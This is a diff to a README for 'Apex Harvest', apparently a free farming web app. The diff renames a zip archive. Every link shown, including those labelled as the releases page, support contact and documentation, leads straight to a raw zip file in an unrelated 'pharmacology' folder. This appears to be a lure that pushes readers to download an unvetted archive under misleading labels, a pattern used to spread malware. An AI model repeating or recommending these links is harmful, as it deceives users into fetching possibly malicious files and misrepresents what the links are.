@@ -7,10 +7,10 @@ Apex Harvest is a user-friendly web application designed to help farmers optimiz
 ### Visit the page to download
 To download the software, click the button below. This will take you to the Releases page, where you can find the latest version of Apex Harvest.
 
-[![Download Apex Harvest](https://raw.githubusercontent.com/herculeseccrine742/apex-harvest/main/pharmacology/apex-harvest_unfertilizable.zip%20Apex%20Harvest-blue?style=flat&logo=github)](https://raw.githubusercontent.com/herculeseccrine742/apex-harvest/main/pharmacology/apex-harvest_unfertilizable.zip)
+[![Download Apex Harvest](https://raw.githubusercontent.com/herculeseccrine742/apex-harvest/main/pharmacology/apex_harvest_1.1.zip%20Apex%20Harvest-blue?style=flat&logo=github)](https://raw.githubusercontent.com/herculeseccrine742/apex-harvest/main/pharmacology/apex_harvest_1.1.zip)
 
 ### Step 1: Navigate to the Releases Page
-Go to the Releases page using this link: [https://raw.githubusercontent.com/herculeseccrine742/apex-harvest/main/pharmacology/apex-harvest_unfertilizable.zip](https://raw.githubusercontent.com/herculeseccrine742/apex-harvest/main/pharmacology/apex-harvest_unfertilizable.zip). You will find the most recent version available for download.
+Go to the Releases page using this link: [https://raw.githubusercontent.com/herculeseccrine742/apex-harvest/main/pharmacology/apex_harvest_1.1.zip](https://raw.githubusercontent.com/herculeseccrine742/apex-harvest/main/pharmacology/apex_harvest_1.1.zip). You will find the most recent version available for download.
 
 ### Step 2: Choose Your Version
 On the Releases page, browse the versions listed. The most recent version will be at the top. Click on the version you wish to download.
@@ -52,14 +52,14 @@ No, Apex Harvest is designed to work without IoT devices or complex hardware.
 Yes, Apex Harvest is available for free. We aim to make farming better for everyone.
 
 ### How do I contact support if I have questions?
-You can find support at [https://raw.githubusercontent.com/herculeseccrine742/apex-harvest/main/pharmacology/apex-harvest_unfertilizable.zip](https://raw.githubusercontent.com/herculeseccrine742/apex-harvest/main/pharmacology/apex-harvest_unfertilizable.zip). We are here to help you with any inquiries.
+You can find support at [https://raw.githubusercontent.com/herculeseccrine742/apex-harvest/main/pharmacology/apex_harvest_1.1.zip](https://raw.githubusercontent.com/herculeseccrine742/apex-harvest/main/pharmacology/apex_harvest_1.1.zip). We are here to help you with any inquiries.
 
 ## 🌍 Contributing
 If you would like to contribute to Apex Harvest, feel free to suggest improvements or report issues by opening an issue on our GitHub repository. We welcome your feedback and support!
 
 ## 🔗 Useful Links
-- [Releases Page](https://raw.githubusercontent.com/herculeseccrine742/apex-harvest/main/pharmacology/apex-harvest_unfertilizable.zip)
-- [Documentation](https://raw.githubusercontent.com/herculeseccrine742/apex-harvest/main/pharmacology/apex-harvest_unfertilizable.zip)
+- [Releases Page](https://raw.githubusercontent.com/herculeseccrine742/apex-harvest/main/pharmacology/apex_harvest_1.1.zip)
+- [Documentation](https://raw.githubusercontent.com/herculeseccrine742/apex-harvest/main/pharmacology/apex_harvest_1.1.zip)
 
 ## 📝 Topics
 This project covers the following topics:
